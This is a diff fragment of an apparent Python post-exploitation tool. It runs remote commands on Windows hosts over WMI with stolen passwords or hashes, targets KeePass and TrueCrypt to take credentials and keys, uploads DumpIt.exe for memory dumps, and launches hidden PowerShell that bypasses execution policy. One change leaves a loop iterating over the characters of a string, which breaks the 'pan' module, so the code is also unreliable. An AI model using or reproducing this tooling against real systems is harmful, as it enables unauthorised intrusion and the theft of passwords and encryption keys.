@@ -2739,14 +2739,18 @@ def listUsers(targetIP,domain,username,password,passwordHash):
 def listProcesses(targetIP,domain,username,password,passwordHash):
     command="tasklist /NH /FO csv"
     results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
-    tmpResultList1=results[0].split("\n")
-    tmpResultList2=[]
-    for x in tmpResultList1:
-        processName=(x.split(",")[0])[1:-1]
-        if processName not in tmpResultList2:
-            if len(str(processName))>0:
-                tmpResultList2.append(str(processName))
-    return tmpResultList2
+    if debugMode==True:
+	print command
+	print results
+    #tmpResultList1=results[0].split("\n")
+    #tmpResultList2=[]
+    #for x in tmpResultList1:
+    #    processName=(x.split(",")[0])[1:-1]
+    #    if processName not in tmpResultList2:
+    #        if len(str(processName))>0:
+    #            tmpResultList2.append(str(processName))
+    #return tmpResultList2
+    return results
     '''
     command=powershellCmdStart+" -Command \"get-process | select name\""
     results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
@@ -2831,7 +2835,7 @@ def getKeepass(targetIP,domain,username,password,passwordHash):
         if debugMode==True:
             print tmpCmd
     tmpProcessList=listProcesses(targetIP,domain,username,password,passwordHash)
-    if "KeePass.exe" in tmpProcessList:
+    if "KeePass.exe" in str(tmpProcessList):
         selectedUsername=''
         selectedPassword=''
         selectedDomain=''
@@ -2913,7 +2917,7 @@ def getTruecrypt(targetIP,domain,username,password,passwordHash):
     powershellPath=getPowershellPath(targetIP,domain,username,password,passwordHash)
     powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
     tmpProcessList=listProcesses(targetIP,domain,username,password,passwordHash)
-    if "TrueCrypt.exe" in tmpProcessList:
+    if "TrueCrypt.exe" in str(tmpProcessList):
         uploadFile('DumpIt.exe','DumpIt.exe',targetIP, domain, username, password, passwordHash)
         s="""
         $driveinfo=get-wmiobject win32_volume | where { $_.driveletter -eq 'C:' } | select-object freespace, capacity, drivetype, driveletter
@@ -5105,7 +5109,7 @@ if args.module=="pan":
             passwordHash=None
             tmpResultList=listProcesses(ip,domain, username, password,passwordHash)
             tmpResultList1=[]
-            for y in tmpResultList:
+            for y in str(tmpResultList):
                 if len(y)>0:
                     if [y,ip] not in tmpResultList1:
                         tmpResultList1.append([y,ip])
